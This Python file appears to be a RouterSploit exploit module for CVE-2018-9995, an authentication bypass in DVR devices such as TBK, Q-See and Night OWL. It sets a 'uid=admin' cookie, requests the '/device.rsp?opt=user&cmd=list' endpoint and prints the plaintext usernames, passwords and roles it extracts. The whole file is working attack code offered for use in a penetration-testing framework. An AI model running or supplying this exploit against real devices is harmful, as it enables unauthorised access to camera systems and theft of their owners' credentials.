import json
from routersploit.core.exploit import *
from routersploit.core.http.http_client import HTTPClient


class Exploit(HTTPClient):
    __info__ = {
        "name": "DVR Creds Disclosure",
        "description": "Module exploits authentication bypass vulnerability in multiple DVR devices allowing "
                       "attacker to retrieve users credentials.",
        "authors": (
            "ezelf <ezelf86[at]protonmail.com>",  # vulnerability discovery
            "Marcin Bury <marcin[at]threat9.com>",  # routersploit module
        ),
        "references": (
            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-9995",
            "https://github.com/ezelf/CVE-2018-9995_dvr_credentials",
        ),
        "devices": (
            "TBK DVR4104",
            "DVR4216",
            "Novo",
            "CeNova",
            "QSee",
            "Pulnix",
            "XVR 5 in 1",
            "Securus",
            "Night OWL",
            "DVR Login",
            "HVR Login",
            "MDVR Login",
        ),
    }

    target = OptIP("", "Target IPv4 or IPv6 address")
    port = OptPort(80, "Target HTTP port")

    def __init__(self):
        self.credentials = []

    def run(self):
        self.credentials = []

        if self.check():
            print_success("Target seems to be vulnerable")
            print_table(("Username", "Password", "Role"), *self.credentials)
        else:
            print_error("Exploit failed - target seems to be not vulnerable")

    @mute
    def check(self):
        cookies = {
            "uid": "admin",
        }
        response = self.http_request(
            method="GET",
            path="/device.rsp?opt=user&cmd=list",
            cookies=cookies,
        )

        if response:
            try:
                json_data = json.loads(response.text)
                for data in json_data["list"]:
                    self.credentials.append((data["uid"], data["pwd"], data["role"]))
                return True  # target is vulnerable
            except Exception:
                pass

        return False  # target is not vulnerable
